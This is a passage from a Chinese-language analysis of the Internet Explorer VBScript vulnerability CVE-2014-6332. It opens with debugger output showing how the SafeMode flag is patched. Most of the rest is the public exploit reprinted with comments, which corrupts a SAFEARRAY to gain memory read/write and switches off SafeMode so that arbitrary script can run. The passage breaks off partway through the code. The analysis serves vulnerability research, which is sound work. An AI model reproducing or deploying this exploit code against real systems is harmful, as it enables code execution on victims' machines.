    0:005> ln poi(ecx)
    (6f354868)   vbscript!COleScript::`vftable'   |  (6f36fdbc)   vbscript!`string'
    Exact matches:
        vbscript!COleScript::`vftable' = 
    0:005> dd ecx+174h L1
    0002bf44  0000000e
    0:005> uf vbscript!COleScript::InSafeMode
    vbscript!COleScript::InSafeMode:
    6f35ce4d f781740100000b000000 test dword ptr [ecx+174h],0Bh
    6f35ce57 6a00            push    0
    6f35ce59 58              pop     eax
    6f35ce5a 0f95c0          setne   al
    6f35ce5d c3              ret
    0:005> eb ecx+174h 4
    0:005> dd ecx+174h L1
    0002bf44  00000004
    0:005> g
    Breakpoint 0 hit
    eax=00000001 ebx=00000000 ecx=0002bdd0 edx=0244d3b0 esi=00000000 edi=00000000
    eip=6f35ce4d esp=0244d400 ebp=0244d488 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!COleScript::InSafeMode:
    6f35ce4d f781740100000b000000 test dword ptr [ecx+174h],0Bh ds:0023:0002bf44=00000004
    0:005> bd *
    0:005> g
    ModLoad: 6efe0000 6efe3000   C:\Windows\system32\sfc.dll
    ModLoad: 6efd0000 6efdd000   C:\Windows\system32\sfc_os.DLL
可以看到，SafeMode标志是vbscript!COleScript对象指针特定偏移处的一个值，在InSafeMode函数中，会检查它和0x0B相与的结果，如果为0，那么VBScript的执行将不再受到限制，即此时SafeMode标志值要为0或4，通过手动修改内存中的这个标志值最终可以弹出记事本。
### 0x04 漏洞利用
在前面分析的基础上，我们来看一下此漏洞的[exploit](https://www.exploit-db.com/exploits/35229/)，具体思路就是通过corrupt后的SAFEARRAY结构来获取RW
primitives，然后对SafeMode标志进行修改，从而执行任意的VBScript代码：
      CVE-2014-6332 exploit by yuange.
    dim aa()  '数组和变量的定义'
    dim ab()
    dim a0
    dim a1
    dim a2
    dim a3
    dim intVersion
    dim myarray
    Begin()
    function Begin()  '程序入口'
      On Error Resume Next
      info=Navigator.UserAgent
      if (instr(info,"Win64")>0) then  '判断系统位数并获取IE版本'
        exit function
      end if
      if (instr(info,"MSIE")>0) then
        intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
      else
        exit function
      end if
      BeginInit()
      if Create()=True then
        myarray=chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
        myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(00)  '定义精心构造的SAFEARRAY结构'
        Setnotsafemode()
      end if
    end function
    function BeginInit()  '数组和变量的初始化'
      Randomize()
      redim aa(5)
      redim ab(5)
      a0=13+17*rnd(6)
      a3=7+3*rnd(5)
    end function
    function Create()  '创建期望的内存布局'
      On Error Resume Next
      dim i
      Create=False
      for i = 0 to 400
        if Over()=True then
          Create=True
          exit for
        end if
      next
    end function
    sub testaa()
    end sub
    function Mydata()  '获取函数对象指针并布局精心构造的SAFEARRAY结构'
      On Error Resume Next
      i=testaa
      i=null
      redim Preserve aa(a2)
      ab(0)=0
      aa(a1)=i
      ab(0)=6.36598737437801E-314  '0x0000000300000003'
      aa(a1+2)=myarray
      ab(2)=1.74088534731324E-310  '0x0000200c0000200c'
      Mydata=aa(a1)
      redim Preserve aa(a0)
    end function
    function Setnotsafemode()
      On Error Resume Next
      i=Mydata()  '获取testaa函数对象指针，即CScriptEntryPoint对象指针'
      i=ReadMemo(i+8)
      i=ReadMemo(i+16)  '获取COleScript对象指针'
      for k=0 to &h60 step 4  '搜索内存中的SafeMode标志值并修改'
        j=ReadMemo(i+&h120+k)
        if (j=14) then
          redim Preserve aa(a2)
          aa(a1+2)(i+&h11c+k)=ab(4)  'write primitive'
          redim Preserve aa(a0)
          exit for
        end if
      next
      ab(2)=1.69759663316747E-313  '0x0000000800000008'
      Runmumaa()
    end function
    function Over()  '判断内存中分配的aa、ab这两个数组是否相邻'
      On Error Resume Next
      dim type1
      Over=False
      a0=a0+a3
      a1=a0+2
      a2=a0+&h8000000
      redim Preserve aa(a0)
      redim ab(a0)
      redim Preserve aa(a2)  '对aa数组进行corrupt'
      type1=1
      ab(0)=1.012345678901234567890123456789  '用作标记值'
      aa(a0)=10
      if (IsObject(aa(a1-1)) = False) then
        if (VarType(aa(a1-1))<>0) then
          if (IsObject(aa(a1)) = False) then
            type1=VarType(aa(a1))
          end if
        end if
      end if
      if (type1=&h0b24) then  '判断是否和标记相符'
        Over=True
      end if
      redim Preserve aa(a0)  '恢复aa数组至corrupt前'
    end function
    function ReadMemo(add)  '借助类型混淆来读取add地址处的值'
      On Error Resume Next
      redim Preserve aa(a2)
      ab(0)=0
      aa(a1)=add+4